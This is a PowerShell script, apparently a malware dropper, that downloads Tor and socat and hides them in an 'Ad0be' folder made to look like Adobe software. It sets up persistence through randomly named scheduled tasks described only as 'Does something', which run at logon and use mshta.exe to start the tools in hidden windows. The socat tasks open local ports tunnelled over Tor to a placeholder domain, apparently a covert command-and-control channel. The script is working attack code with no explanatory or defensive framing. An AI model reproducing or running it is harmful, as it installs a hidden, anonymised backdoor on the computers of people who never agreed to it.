function Unzip
{
param([string]$zipfile, [string]$destination);
$7z = Join-Path $env:Temp '7za.exe';
if (-NOT (Test-Path $7z)){
Try
{
(New-Object System.Net.WebClient).DownloadFile('https://chocolatey.org/7za.exe',$7z);
}
Catch{}
}
if ($(Try { Test-Path $7z.trim() } Catch { $false })){
Start-Process "$7z" -ArgumentList "x -o`"$destination`" -y `"$zipfile`"" -Wait -NoNewWindow
}
else{
$shell = new-object -com shell.application;
$zip = $shell.NameSpace($zipfile);
foreach($item in $zip.items())
{
$shell.Namespace($destination).copyhere($item);
}
}
}
function Base64ToFile
{
param([string]$file, [string]$string);
$bytes=[System.Convert]::FromBase64String($string);
#set-content -encoding byte $file -value $bytes;
[IO.File]::WriteAllBytes($file, $bytes);
}
function AddTask
{
param([string]$name, [string]$cmd, [string]$params='',[int]$restart=0,[int]$delay=0,[string]$dir='');
$ts=New-Object Microsoft.Win32.TaskScheduler.TaskService;
$td=$ts.NewTask();
$td.RegistrationInfo.Description = 'Does something';
$td.Settings.DisallowStartIfOnBatteries = $False;
$td.Settings.StopIfGoingOnBatteries = $False;
$td.Settings.MultipleInstances = [Microsoft.Win32.TaskScheduler.TaskInstancesPolicy]::IgnoreNew;
$LogonTrigger = New-Object Microsoft.Win32.TaskScheduler.LogonTrigger;
$LogonTrigger.StartBoundary=[System.DateTime]::Now;
$LogonTrigger.UserId=$env:username;
$LogonTrigger.Delay=[System.TimeSpan]::FromSeconds($delay);
$td.Triggers.Add($LogonTrigger);
if($restart -eq 1){
$TimeTrigger = New-Object Microsoft.Win32.TaskScheduler.TimeTrigger;
$TimeTrigger.StartBoundary=[System.DateTime]::Now;
$TimeTrigger.Repetition.Interval=[System.TimeSpan]::FromMinutes(20);
$TimeTrigger.Repetition.StopAtDurationEnd=$False;
$td.Triggers.Add($TimeTrigger);
}
$ExecAction=New-Object Microsoft.Win32.TaskScheduler.ExecAction($cmd,$params,$dir);
$td.Actions.Add($ExecAction);
$task=$ts.RootFolder.RegisterTaskDefinition($name, $td);
$task.Run();
}
function RandomString{
    param([int]$min=5, [int]$max=15);
    return (-join ((48..57)+(65..90)+(97..122) | Get-Random -Count (Get-Random -minimum $min -maximum $max) | % {[char]$_}));
}
function Download {
    param([string]$url, [string]$file);
    $ErrorActionPreference = "Stop";
    try {
        Start-BitsTransfer -Source $url -Destination $file;
    }
    catch {
        try {
            (New-Object System.Net.WebClient).DownloadFile($url,$file);
        }
        catch {
            Start-Process "cmd.exe" -ArgumentList "/b /c bitsadmin /transfer /download /priority HIGH `"$url`" `"$file`">nul" -Wait -WindowStyle Hidden;
        }
    }finally{
        $ErrorActionPreference = "Continue";
    }
    if ( $(Try { Test-Path $file.trim() } Catch { $false })){
        return $true;
    }
    return $false;
}
function ITP{
$File=$env:Temp+'\'+(RandomString)+'.zip';
$Dest=$env:Temp+'\'+(RandomString);
while (!(Download 'https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg' $File)) {}
if ((Test-Path $Dest) -eq 1){Remove-Item -Force -Recurse $Dest;}md $Dest | Out-Null;
Unzip $File $Dest;
rm -Force $File;
$TSAssembly=$Dest+'\lib\net20\Microsoft.Win32.TaskScheduler.dll';
$loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
$TFile=$env:Temp+'\'+(RandomString)+'.zip'
$DestTP=$env:APPDATA+'\Ad0be';
$TorMirrors=@("https://torproject.urown.net/dist/",
"https://dist.torproject.org/",
"https://torproject.mirror.metalgamer.eu/dist/",
"https://tor.ybti.net/dist/");
foreach ($mirror in $TorMirrors) {
    $_url=$mirror+'torbrowser/7.0.5/tor-win32-0.3.0.10.zip';
    if((Download $_url $TFile)){
        break;
    }
}
if ((Test-Path $DestTP) -eq 1){Remove-Item -Force -Recurse $DestTP;}mkdir $DestTP | Out-Null;
Unzip $TFile $DestTP;
Remove-Item -Force $TFile;
$tor=$DestTP+'\Tor\tor.exe';
$tor=$tor.Replace('\','/');
$tor_cmd="`"javascript:close(new ActiveXObject('WScript.Shell').Run('$tor',0,false))`"";
AddTask (RandomString) 'mshta.exe' $tor_cmd;
$SFile=$env:Temp+'\'+(RandomString)+'.zip';
while (!(Download 'https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip' $SFile)){}
Unzip $SFile $DestTP;
$s_old=$DestTP+'\socat-windows-1.7.2.1\';
$s_new=(RandomString);
Remove-Item -Force $SFile;
Rename-Item -path $s_old -newName $s_new;
$s_fold=$DestTP+'\'+$s_new+'\';
$s1cmd='socat tcp4-LISTEN:5555,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:80,socksport=9050';
$s2cmd='socat tcp4-LISTEN:5588,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:5588,socksport=9050';
$s1_cmd="`"javascript:close(new ActiveXObject('WScript.Shell').Run('$s1cmd',0,false))`"";
$s2_cmd="`"javascript:close(new ActiveXObject('WScript.Shell').Run('$s2cmd',0,false))`"";
AddTask (RandomString) 'mshta.exe' $s1_cmd 0 0 $s_fold;
AddTask (RandomString) 'mshta.exe' $s2_cmd 0 0 $s_fold;
}
ITP
